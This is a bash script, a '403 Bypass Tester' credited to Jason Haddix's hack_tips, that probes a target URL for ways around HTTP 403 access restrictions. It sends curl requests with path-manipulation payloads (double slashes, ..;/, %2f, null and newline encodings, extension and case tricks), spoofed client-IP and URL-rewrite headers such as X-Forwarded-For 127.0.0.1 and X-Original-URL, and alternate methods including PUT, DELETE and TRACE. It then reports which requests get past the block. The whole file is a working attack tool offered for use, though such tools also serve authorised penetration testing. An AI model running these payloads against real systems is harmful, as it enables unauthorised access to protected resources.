#!/bin/bash
# 403 Bypass Tester - Based on Jason Haddix's hack_tips
# https://github.com/Arcanum-Sec/hack_tips/blob/main/403bypass.md

set -euo pipefail

if [ $# -lt 1 ]; then
    echo "Usage: $0 <url> [path]"
    echo "Example: $0 https://target.com/admin"
    echo "Example: $0 https://target.com admin"
    exit 1
fi

URL="$1"
TIMEOUT=5

# Parse URL into base and path
if [ $# -ge 2 ]; then
    BASE="${URL%/}"
    PATH_PART="$2"
else
    # Extract base URL and path
    BASE=$(echo "$URL" | grep -oP '^https?://[^/]+')
    PATH_PART=$(echo "$URL" | grep -oP '^https?://[^/]+\K.*' | sed 's|^/||')
fi

if [ -z "$PATH_PART" ]; then
    echo "Error: No path specified"
    exit 1
fi

echo "=== 403 Bypass Tester ==="
echo "Base: $BASE"
echo "Path: $PATH_PART"
echo ""

# Function to test a URL and report status
test_url() {
    local test_url="$1"
    local desc="$2"
    local status
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time $TIMEOUT "$test_url" 2>/dev/null || echo "ERR")
    if [ "$status" != "403" ] && [ "$status" != "ERR" ] && [ "$status" != "000" ]; then
        echo "[${status}] $desc"
        echo "    $test_url"
    fi
}

# Function to test with headers
test_header() {
    local header="$1"
    local desc="$2"
    local status
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time $TIMEOUT -H "$header" "$BASE/$PATH_PART" 2>/dev/null || echo "ERR")
    if [ "$status" != "403" ] && [ "$status" != "ERR" ] && [ "$status" != "000" ]; then
        echo "[${status}] Header: $desc"
        echo "    $header"
    fi
}

# Function to test with method
test_method() {
    local method="$1"
    local status
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time $TIMEOUT -X "$method" "$BASE/$PATH_PART" 2>/dev/null || echo "ERR")
    if [ "$status" != "403" ] && [ "$status" != "ERR" ] && [ "$status" != "000" ]; then
        echo "[${status}] Method: $method"
    fi
}

echo "--- URL Manipulation ---"

# Slash tricks
test_url "$BASE//$PATH_PART//" "Double slashes"
test_url "$BASE///$PATH_PART///" "Triple slashes"
test_url "$BASE/./$PATH_PART/./" "Dot slashes"
test_url "$BASE/$PATH_PART/." "Trailing dot"
test_url "$BASE/$PATH_PART/./" "Trailing dot slash"
test_url "$BASE/$PATH_PART/.//" "Trailing dot double slash"

# Query string tricks
test_url "$BASE/$PATH_PART/?" "Trailing ?"
test_url "$BASE/$PATH_PART??" "Double ??"
test_url "$BASE/$PATH_PART/?/" "/?/"
test_url "$BASE/$PATH_PART/??/" "/??/"
test_url "$BASE/$PATH_PART?id=1" "With param"

# Dot dot tricks
test_url "$BASE/$PATH_PART/.." "Trailing .."
test_url "$BASE/$PATH_PART/../" "Trailing ../"
test_url "$BASE/$PATH_PART/..;/" "..;/"
test_url "$BASE/..;/$PATH_PART" "..;/ prefix"
test_url "$BASE/.;/$PATH_PART" ".;/ prefix"
test_url "$BASE/;/$PATH_PART" ";/ prefix"
test_url "$BASE//;//$PATH_PART" "//;// prefix"

# Encoding tricks
test_url "$BASE/$PATH_PART/%2f" "%2f suffix"
test_url "$BASE/$PATH_PART/%2f/" "%2f/ suffix"
test_url "$BASE/$PATH_PART/%20" "%20 suffix"
test_url "$BASE/$PATH_PART/%09" "%09 (tab)"
test_url "$BASE/$PATH_PART/%0a" "%0a (newline)"
test_url "$BASE/$PATH_PART/%0d" "%0d (CR)"
test_url "$BASE/$PATH_PART/%00" "%00 (null)"
test_url "$BASE/%2e/$PATH_PART" "%2e prefix"

# Special char tricks
test_url "$BASE/$PATH_PART/#" "Hash"
test_url "$BASE/$PATH_PART/#/" "Hash slash"
test_url "$BASE/$PATH_PART/*" "Asterisk"
test_url "$BASE/$PATH_PART/~" "Tilde"
test_url "$BASE/$PATH_PART/-" "Dash"
test_url "$BASE/$PATH_PART/&" "Ampersand"
test_url "$BASE/*/$PATH_PART" "Asterisk prefix"

# Extension tricks
test_url "$BASE/$PATH_PART.json" ".json"
test_url "$BASE/$PATH_PART/.json" "/.json"
test_url "$BASE/$PATH_PART.css" ".css"
test_url "$BASE/$PATH_PART.html" ".html"

# Case tricks
UPPER_PATH=$(echo "$PATH_PART" | tr '[:lower:]' '[:upper:]')
test_url "$BASE/$UPPER_PATH" "UPPERCASE"

# Backslash tricks (Windows)
test_url "$BASE/$PATH_PART\\" "Backslash"
test_url "$BASE/$PATH_PART/..%3B/" "..%3B/"

echo ""
echo "--- Header Bypass ---"

test_header "X-Forwarded-For: 127.0.0.1" "X-Forwarded-For localhost"
test_header "X-Forwarded-For: 10.0.0.1" "X-Forwarded-For internal"
test_header "X-Original-URL: /$PATH_PART" "X-Original-URL"
test_header "X-Rewrite-URL: /$PATH_PART" "X-Rewrite-URL"
test_header "X-Custom-IP-Authorization: 127.0.0.1" "X-Custom-IP-Authorization"
test_header "X-Real-IP: 127.0.0.1" "X-Real-IP"
test_header "X-Remote-IP: 127.0.0.1" "X-Remote-IP"
test_header "X-Client-IP: 127.0.0.1" "X-Client-IP"
test_header "X-Host: localhost" "X-Host"
test_header "X-Forwarded-Host: localhost" "X-Forwarded-Host"
test_header "True-Client-IP: 127.0.0.1" "True-Client-IP"
test_header "Client-IP: 127.0.0.1" "Client-IP"
test_header "Cluster-Client-IP: 127.0.0.1" "Cluster-Client-IP"

echo ""
echo "--- Method Bypass ---"

test_method "POST"
test_method "PUT"
test_method "PATCH"
test_method "DELETE"
test_method "OPTIONS"
test_method "TRACE"

echo ""
echo "=== Done ==="
